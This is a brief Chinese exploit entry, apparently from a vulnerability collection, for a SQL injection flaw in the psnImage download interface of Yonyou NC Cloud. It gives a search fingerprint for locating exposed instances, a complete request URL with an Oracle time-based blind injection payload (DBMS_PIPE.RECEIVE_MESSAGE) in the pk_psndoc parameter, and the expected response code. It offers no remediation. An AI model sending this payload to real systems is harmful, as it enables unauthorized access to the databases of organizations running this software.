# 用友NC接口psnImagedownload存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`http://ip/portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)CHR(79)CHR(66)CHR(101),5)%20AND%20(%27rASZ%27=%27rASZ`
- **响应特征**：200